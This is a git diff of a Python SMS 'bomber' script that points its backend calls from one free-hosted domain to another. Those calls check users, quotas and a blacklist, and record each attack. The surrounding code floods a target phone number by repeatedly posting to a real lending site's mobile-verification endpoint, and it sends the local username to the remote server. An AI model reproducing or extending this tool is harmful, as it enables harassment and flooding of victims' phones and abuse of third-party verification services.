@@ -6,7 +6,7 @@ import json
 import time
 un=getpass.getuser();
 def ifExists(un):
-    request_string="http://www.ms800hub.rf.gd/ogbomber/isExist.php?un="+un
+    request_string="http://ogbomber.rf.gd/ogbomber/isExist.php?un="+un
     exists_response=requests.get(request_string).text
     if 'true' in exists_response:
         return True
@@ -14,7 +14,7 @@ def ifExists(un):
         return False
 
 def blackList(phno):
-    request_string="http://www.ms800hub.rf.gd/ogbomber/blackList.php"
+    request_string="http://ogbomber.rf.gd/ogbomber/blackList.php"
     bl=requests.get(request_string).text
     bl_json=json.loads(bl)
     for i in bl_json:
@@ -23,14 +23,14 @@ def blackList(phno):
     return True
 
 def getUserDetails(un):
-    request_string="http://www.ms800hub.rf.gd/ogbomber/userDetails.php?un="+un
+    request_string="http://ogbomber.rf.gd/ogbomber/userDetails.php?un="+un
     user_details=requests.get(request_string).text.split('\x00',2)[1]
     user_details_json=json.loads(user_details)
     u=user_details_json
     return u
 
 def checkQuota(x):
-    request_string="http://www.ms800hub.rf.gd/ogbomber/checkQuota.php?id="+x["uid"]
+    request_string="http://ogbomber.rf.gd/ogbomber/checkQuota.php?id="+x["uid"]
     daily_quota=requests.get(request_string).text.split('\x00',2)[1]
     try:
         int(daily_quota)
@@ -175,7 +175,7 @@ def startBombing(pn,cc,n,un):
         response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
         i-=1
     u=getUserDetails(un)
-    request_string="http://www.ms800hub.rf.gd/ogbomber/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
+    request_string="http://ogbomber.rf.gd/ogbomber/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
     response=requests.get(request_string).text
 
 def checkConnectivity():
